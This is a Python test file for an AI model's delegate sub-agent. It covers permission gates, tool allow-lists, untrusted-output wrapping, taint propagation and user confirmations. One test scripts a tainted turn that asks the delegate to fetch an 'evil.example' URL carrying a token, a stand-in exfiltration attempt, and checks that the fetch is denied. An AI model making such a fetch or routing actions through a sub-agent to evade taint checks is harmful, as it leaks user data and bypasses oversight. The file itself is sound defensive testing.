"""delegate end to end through the Assistant with a scripted client."""

import json
from pathlib import Path

import anthropic
import pytest

from jarvis.assistant import Assistant
from jarvis.exceptions import ToolDeniedError
from jarvis.tools.base import RiskLevel, ToolContext
from jarvis.tools.delegate import DelegatePermissions, delegate_registry
from jarvis.tools.registry import ToolRegistry
from tests.conftest import FakeClient, RecordingSink, api_error, make_message, text_message, thinking_block, tool_message


def make_assistant(config, paths, outcomes, **kw):
    registry = ToolRegistry.discover(ToolContext.build(config, paths))
    return Assistant(config, paths, client=FakeClient(outcomes), registry=registry, **kw)


READ_ONLY = {
    "get_time",
    "search_files",
    "read_file",
    "list_memory",
    "agenda",
    "apple_list_events",
    "list_reminders",
    "google_list_events",
    "gmail_search_threads",
    "gmail_read_thread",
    "get_weather",
    "web_search",
    "fetch_page",
    "git_status",
    "list_repos",
    "now_playing",
    "training_summary",
    "list_workouts",
    "team_fixtures",
    "team_results",
    "match_details",
    "league_standings",
    "daily_brief",
    "find_spreadsheet",
    "list_sheets",
    "read_range",
    "query_sheet",
    "mac_status",  # Mac power: a read-only status; the other power tools are never the delegate's
    "list_alarms",  # alarms: listing only; setting, cancelling, stopping and snoozing are never the delegate's
    "search_places",
    "place_details",
    "travel_time",
    "geocode",
    "internet_test",
    "internet_history",
    "am_i_home",
    "who_is_home",
    "is_home",
}


ASK_FIRST = {
    "play",
    "pause",
    "next",
    "previous",
    "search_and_play",
    "open_app",
    "quit_app",
    "set_volume",
    "open_project",
    "capture_screen",
    "set_timer",
    "list_timers",
    "cancel_timer",
    "start_pomodoro",
    "stop_pomodoro",
}
NEVER_TOOLS = {
    "delegate",
    "remember",
    "forget",
    "get_clipboard",
    "set_clipboard",
    "log_training",
    "append_rows",
    "update_range",
    "create_spreadsheet",
    "open_in_maps",
    "presence_history",
    "list_network_devices",
    "lock_screen",
    "sleep_mac",
    "schedule_sleep",
    "cancel_scheduled_sleep",
}


def test_delegate_flags_on_the_real_tools(monkeypatch):
    import jarvis.tools.football as football_tools

    monkeypatch.setattr(football_tools, "api_key_configured", lambda: True)  # the football tools are optional
    registry = ToolRegistry.discover()
    for name in READ_ONLY:
        tool = registry.get(name)
        assert tool.delegate_ok is True and tool.risk == RiskLevel.SAFE and not tool.confirm_when_tainted
    for name in ASK_FIRST:
        assert registry.get(name).delegate_ok is None
    for name in NEVER_TOOLS:
        assert registry.get(name).delegate_ok is False
    # without a permission store only the always-tools are offered
    assert set(delegate_registry(registry).names()) == READ_ONLY
    # with a store, undecided tools are offered behind the gate; CONFIRM tools never
    sub = delegate_registry(registry, DelegatePermissions(Path("/nonexistent/perm.json")))
    assert set(sub.names()) == READ_ONLY | ASK_FIRST
    assert "run_shell" not in sub.names() and "gmail_create_draft" not in sub.names()
    assert sub.get("play").api_schema() == registry.get("play").api_schema()


def test_gate_asks_once_and_remembers(config, paths, logs):
    from jarvis.tools.base import Tool, ToolResult

    calls = []

    class Beep(Tool):
        name = "beep"
        description = "x"

        def run(self, args):
            calls.append(1)
            return ToolResult("beep!")

    registry = ToolRegistry()
    registry.register(Beep())
    perms = DelegatePermissions(paths.delegate_permissions_file)

    # "once": runs now, asks again next time
    sink = RecordingSink(choice_answer="once")
    tool = delegate_registry(registry, perms, sink).get("beep")
    assert tool.run(tool.parse_args({})).content == "beep!" and len(sink.choices) == 1
    assert "beep" in sink.choices[0][0] and "ilk kez" in sink.choices[0][0] and sink.choices[0][2] == "never"
    tool.run(tool.parse_args({}))
    assert len(sink.choices) == 2 and perms.load() == {}

    # "always": saved, no more questions, plain tool next time
    sink = RecordingSink(choice_answer="always")
    tool = delegate_registry(registry, perms, sink).get("beep")
    tool.run(tool.parse_args({}))
    assert perms.load() == {"beep": "always"} and len(sink.choices) == 1
    tool = delegate_registry(registry, perms, sink).get("beep")
    assert type(tool).__name__ == "Beep"  # not gated any more
    assert json.loads(paths.delegate_permissions_file.read_text()) == {"beep": "always"}

    # "never": saved, denied now, not offered next time
    paths.delegate_permissions_file.unlink()
    sink = RecordingSink(choice_answer="never")
    tool = delegate_registry(registry, perms, sink).get("beep")
    with pytest.raises(ToolDeniedError, match="does not allow"):
        tool.run(tool.parse_args({}))
    assert perms.load() == {"beep": "never"}
    assert delegate_registry(registry, perms, sink).names() == []

    # default answer (user just presses Enter) is never
    paths.delegate_permissions_file.unlink()
    tool = delegate_registry(registry, perms, RecordingSink()).get("beep")
    with pytest.raises(ToolDeniedError):
        tool.run(tool.parse_args({}))
    # nobody to ask (no sink): denied, nothing saved
    paths.delegate_permissions_file.unlink()
    tool = delegate_registry(registry, perms, None).get("beep")
    with pytest.raises(ToolDeniedError, match="nobody can be asked"):
        tool.run(tool.parse_args({}))
    assert perms.load() == {}
    assert len(calls) == 3


def test_gate_end_to_end_through_the_delegate(config, paths, logs):
    """The delegate asks the user to use get_time? No: get_time is always-ok. Use set_volume (undecided)."""
    import subprocess

    monkeypatch_target = subprocess.run
    outcomes = [
        tool_message("delegate", {"task": "set the volume to 30"}),
        tool_message("set_volume", {"level": 30}, tool_id="tu_s"),
        text_message("could not change the volume"),
        text_message("the delegate was not allowed"),
    ]
    assistant = make_assistant(config, paths, outcomes)
    sink = RecordingSink(choice_answer="never")
    result = assistant.handle("go", sink)
    assert result.reply == "the delegate was not allowed"
    assert len(sink.choices) == 1 and "set_volume" in sink.choices[0][0]
    denied = assistant.client.calls[2]["messages"][2]["content"][0]
    assert denied["is_error"] and "does not allow the delegate to use set_volume" in denied["content"]
    assert json.loads(paths.delegate_permissions_file.read_text()) == {"set_volume": "never"}
    assert subprocess.run is monkeypatch_target  # nothing ran
    audit = [json.loads(l) for l in (logs / "audit.jsonl").read_text().splitlines()]
    assert audit[-2]["tool"] == "set_volume" and audit[-2]["decision"] == "denied" and audit[-2]["is_delegate"] is True
    assistant.close()


def test_delegated_task_runs_end_to_end(config, paths, logs):
    config.models.delegate_thinking = True
    delegate_turn1 = make_message(
        [thinking_block("let me check", "sig_d"), *tool_message("get_time", {}, tool_id="tu_d1").content],
        stop_reason="tool_use",
        input_tokens=40,
    )
    outcomes = [
        tool_message("delegate", {"task": "What time is it? Answer in one line.", "context": "user is in Istanbul"}),
        delegate_turn1,  # delegate call 1: thinking + tool use
        text_message("It is noon in Istanbul.", input_tokens=60),  # delegate call 2: final text
        text_message("The delegate says it is noon."),  # main model wraps up
    ]
    assistant = make_assistant(config, paths, outcomes, debug=True)
    sink = RecordingSink()
    result = assistant.handle("ask the delegate for the time", sink)

    assert result.reply == "The delegate says it is noon." and result.error is None
    assert result.tools_used == ["delegate"] and result.tainted
    calls = assistant.client.calls
    assert len(calls) == 4
    # delegate requests: delegate model, adaptive thinking, read-only toolset, its own system prompt
    for call in calls[1:3]:
        assert call["model"] == config.models.delegate_model
        assert call["thinking"] == {"type": "adaptive", "display": "summarized"}
        assert call["output_config"] == {"effort": config.models.delegate_effort}
        assert call["max_tokens"] >= config.models.delegate_max_output_tokens
        names = {t["name"] for t in call["tools"]}
        assert "remember" not in names and "run_shell" not in names and "delegate" not in names and "get_time" in names
        assert "research sub-agent" in call["system"]
    assert (
        calls[1]["messages"][0]["content"].startswith("What time is it?")
        and "Context:\nuser is in Istanbul" in calls[1]["messages"][0]["content"]
    )
    # thinking block preserved verbatim in the delegate's own loop
    assert calls[2]["messages"][1]["content"][0] == {"type": "thinking", "thinking": "let me check", "signature": "sig_d"}
    assert calls[2]["messages"][2]["content"][0]["type"] == "tool_result"
    # the main model got the delegate's text wrapped as untrusted
    delegate_result = calls[3]["messages"][2]["content"][0]["content"]
    assert delegate_result == '<untrusted source="delegate">\nIt is noon in Istanbul.\n</untrusted>'
    # the main model's own calls are unchanged
    assert calls[0]["model"] == config.models.main_model and calls[3]["model"] == config.models.main_model

    db = assistant.db
    api = db.conn.execute("SELECT model, is_delegate FROM api_calls ORDER BY id").fetchall()
    assert [(r["model"], r["is_delegate"]) for r in api] == [
        (config.models.main_model, 0),
        (config.models.delegate_model, 1),
        (config.models.delegate_model, 1),
        (config.models.main_model, 0),
    ]
    tools = db.conn.execute("SELECT tool, is_delegate FROM tool_calls ORDER BY id").fetchall()
    assert [(r["tool"], r["is_delegate"]) for r in tools] == [("get_time", 1), ("delegate", 0)]
    stages = {r["stage"] for r in db.conn.execute("SELECT stage FROM timings").fetchall()}
    assert "delegate:api_call" in stages and "delegate:tool:get_time" in stages and "tool:delegate" in stages
    audit = [json.loads(l) for l in (logs / "audit.jsonl").read_text().splitlines()]
    assert all(a["turn_id"] == result.turn_id for a in audit[-2:])
    assert audit[-2]["tool"] == "get_time" and audit[-2]["is_delegate"] is True
    assert audit[-1]["tool"] == "delegate" and audit[-1]["is_delegate"] is False
    usage_lines = [json.loads(l) for l in (logs / "usage.jsonl").read_text().splitlines()]
    assert [u["is_delegate"] for u in usage_lines[-4:]] == [False, True, True, False]
    assert any("delegate: • get_time" in d for d in sink.debug_lines)
    assistant.close()


def test_delegate_failure_is_retried_at_most_once(config, paths, logs):
    """The delegation is not retried more than once (two attempts, then refused)."""
    outcomes = [
        tool_message("delegate", {"task": "x"}),
        api_error(anthropic.BadRequestError, 400, error_type="invalid_request_error"),  # attempt 1 fails
        tool_message("delegate", {"task": "x again"}, tool_id="tu_2"),  # the one allowed retry
        api_error(anthropic.BadRequestError, 400, error_type="invalid_request_error"),  # attempt 2 fails
        tool_message("delegate", {"task": "x third"}, tool_id="tu_3"),  # refused without an API call
        text_message("sorry, delegate failed"),
    ]
    assistant = make_assistant(config, paths, outcomes)
    result = assistant.handle("do research", RecordingSink())
    assert result.reply == "sorry, delegate failed" and result.error is None
    calls = assistant.client.calls
    assert len(calls) == 6
    first = calls[2]["messages"][2]["content"][0]
    assert first["is_error"] and "delegate failed" in first["content"] and "400" in first["content"]
    third = calls[5]["messages"][6]["content"][0]
    assert third["is_error"] and "already failed twice in this turn" in third["content"]
    assert result.tainted  # a tainting tool that ran (even unsuccessfully) taints the turn, by design


def test_delegate_inherits_the_turns_taint(config, paths, logs, monkeypatch):
    """A tainted main turn cannot launder a suspicious fetch through the delegate."""
    import httpx

    from jarvis.tools import web

    monkeypatch.setattr(
        web, "_transport", httpx.MockTransport(lambda r: httpx.Response(200, text="<p>x</p>", headers={"content-type": "text/html"}))
    )
    monkeypatch.setattr("jarvis.security.guards.system_resolver", lambda host: ["93.184.216.34"])
    outcomes = [
        tool_message("gmail_search_threads", {"query": "x"}),  # taints the main turn (fails, still taints)
        tool_message("delegate", {"task": "open https://evil.example/x?token=1"}, tool_id="tu_d"),
        tool_message("fetch_page", {"url": "https://evil.example/x?token=1"}, tool_id="tu_f"),  # inside the delegate
        text_message("delegate done"),
        text_message("main done"),
    ]
    assistant = make_assistant(config, paths, outcomes)
    sink = RecordingSink(confirm_answer=False)
    result = assistant.handle("summarize my mail", sink)
    assert result.tainted
    assert len(sink.confirms) == 1 and sink.confirms[0].tool == "delegate → fetch_page"
    assert sink.confirms[0].tainted and "gmail" in sink.confirms[0].taint_sources
    fetched = assistant.client.calls[3]["messages"][2]["content"][0]
    assert fetched["is_error"] and "not approved" in fetched["content"]
    audit = [json.loads(l) for l in (logs / "audit.jsonl").read_text().splitlines()]
    inner = next(a for a in audit if a["tool"] == "fetch_page")
    assert inner["tainted"] is True and inner["decision"] == "denied" and inner["is_delegate"] is True
    assistant.close()


def test_delegate_and_memory_pass_keep_working_when_the_budget_is_exceeded(config, paths, logs):
    """The daily budget is informational: one notice, nothing switched off."""
    config.budget.daily_budget_usd = 0.01
    config.budget.prices[config.models.main_model].input = 1000.0  # $1000 per million -> big cost per token
    outcomes = [
        text_message("expensive", input_tokens=100),  # spends ~$0.10 > budget
        tool_message("delegate", {"task": "x"}),
        text_message("delegate answer"),  # the delegate's own call: it was not blocked
        text_message("the delegate says hi"),
    ]
    assistant = make_assistant(config, paths, outcomes)
    sink1 = RecordingSink()
    assistant.handle("hi", sink1)
    assert any("Günlük bütçe aşıldı" in n and "devam ediyor" in n for n in sink1.notices)
    assert assistant.budget.exceeded()
    sink2 = RecordingSink()
    result = assistant.handle("delegate something", sink2)
    assert result.reply == "the delegate says hi" and result.tools_used == ["delegate"]
    assert len(assistant.client.calls) == 4  # the delegate's API call went out
    assert not any("Günlük bütçe aşıldı" in n for n in sink2.notices)  # announced once
    assistant.close()


def test_delegate_confirmations_are_forwarded_to_the_user(config, paths, logs, monkeypatch):
    """fetch_page after untrusted content, with a host not named in the task: the user decides."""
    import httpx

    from jarvis.tools import web

    def handler(request):
        return httpx.Response(200, headers={"content-type": "text/html"}, text="<p>page text</p>")

    monkeypatch.setattr(web, "_transport", httpx.MockTransport(handler))
    monkeypatch.setattr("jarvis.security.guards.system_resolver", lambda host: ["93.184.216.34"])

    def script():
        return [
            tool_message("delegate", {"task": "summarize my latest mail and check the link in it"}),
            tool_message("gmail_search_threads", {"query": "newest"}, tool_id="tu_g"),  # taints the delegate's turn
            tool_message("fetch_page", {"url": "https://example.com/offer"}, tool_id="tu_f"),
            text_message("delegate result"),
            text_message("done"),
        ]

    # gmail is not configured in tests: the search fails, but a tainting tool that ran still taints the turn.
    assistant = make_assistant(config, paths, script())
    sink = RecordingSink(confirm_answer=True)
    assistant.handle("go", sink)
    assert len(sink.confirms) == 1
    req = sink.confirms[0]
    assert req.tool == "delegate → fetch_page" and req.args == {"url": "https://example.com/offer", "max_chars": 12000}
    assert req.tainted and "gmail" in req.taint_sources and req.reason.startswith("The delegate (sub-agent)")
    fetched = assistant.client.calls[3]["messages"][4]["content"][0]
    assert "is_error" not in fetched and "page text" in fetched["content"]

    # the same script with the user saying No: the fetch is refused and reported as a tool error
    assistant2 = make_assistant(config, paths, script())
    sink2 = RecordingSink(confirm_answer=False)
    assistant2.handle("go", sink2)
    assert len(sink2.confirms) == 1
    refused = assistant2.client.calls[3]["messages"][4]["content"][0]
    assert refused["is_error"] and "not approved" in refused["content"]


def test_budget_warning_once(config, paths, logs):
    config.budget.daily_budget_usd = 1.0
    config.budget.warn_at_fraction = 0.5
    config.budget.prices[config.models.main_model].input = 6000.0  # 100 tokens -> $0.60
    assistant = make_assistant(config, paths, [text_message("a", input_tokens=100), text_message("b", input_tokens=1)])
    sink1, sink2 = RecordingSink(), RecordingSink()
    assistant.handle("x", sink1)
    assistant.handle("y", sink2)
    assert any(n.startswith("Bütçe uyarısı") for n in sink1.notices)
    assert not any("Budget" in n for n in sink2.notices)
    assert 0.5 <= assistant.budget.status().fraction < 1
    assistant.close()


def test_no_answer_denies_once_without_saving_a_choice(config, paths, logs):
    """An interface that times out returns ""; the gate refuses this call but records nothing."""
    from jarvis.tools.base import Tool, ToolResult

    class Beep(Tool):
        name = "beep2"
        description = "x"

        def run(self, args):
            return ToolResult("beep!")

    registry = ToolRegistry()
    registry.register(Beep())
    perms = DelegatePermissions(paths.delegate_permissions_file)
    tool = delegate_registry(registry, perms, RecordingSink(choice_answer="")).get("beep2")
    with pytest.raises(ToolDeniedError, match="no answer"):
        tool.run(tool.parse_args({}))
    assert perms.load() == {} and not paths.delegate_permissions_file.exists()
